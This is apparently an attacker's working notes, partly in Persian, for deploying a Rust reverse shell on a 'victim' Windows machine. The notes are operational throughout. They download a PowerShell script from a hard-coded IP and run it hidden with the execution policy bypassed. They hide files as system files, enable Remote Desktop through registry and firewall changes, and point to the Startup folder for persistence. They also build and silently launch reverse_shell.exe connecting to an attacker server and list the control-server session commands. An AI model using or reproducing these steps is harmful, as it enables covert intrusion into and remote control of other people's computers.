sudo apt update
sudo apt install python3-pip
sudo ufw allow 37945
pip install -r requirements.txt


-------
دستورات مهم روی cmd
دانلود فایل روی سیستم victim
curl -o "test2.ps1" "http://88.198.104.155/test2.ps1" 
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "bak2.ps1"

attrib +h +s "C:\مسیر\فایل\filename.ext"
مخفی کردن به صورتی که به این راحتی ها پیدا نمیشه

File Explorer را باز کنید.

به View → Show → Hidden items بروید و تیکش را بزنید.

سپس به Options → View بروید.

تیک گزینه Hide protected operating system files (Recommended) را بردارید.

پیغام هشدار را تایید کنید.

✅ حالا فایل‌هایی که هم Hidden و هم System هستند هم نمایش داده می‌شوند.
اینطوری دوباره ظاهر میشه


فعال کردن ریموت دسکتاپ
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
sc config TermService start= auto
sc start TermService
اطمینان از دسترسی دادن فایروال
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes

مسیر پوشه استارت آپ
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
----------------------
install Visual Studio Build Tools for C++ from:
https://visualstudio.microsoft.com/visual-cpp-build-tools/

find main.rs and change this line:
    let server_addr = "88.198.104.155:37945";
Replace it with your Linux server’s IP address


cd reverse_shell
cargo build --release --target x86_64-pc-windows-msvc

you can find exe file in:
	target\x86_64-pc-windows-msvc\release\reverse_shell.exe


اجرا بدون باز شدن پنجره
start /B reverse_shell.exe

پس از اجرای سرور، دستورات زیر را می‌توانید استفاده کنید:

sessions: نمایش لیست سشن‌های فعال
connect <id>: اتصال به یک سشن خاص
info <id>: دریافت اطلاعات سیستم یک سشن
exit: خروج از سرور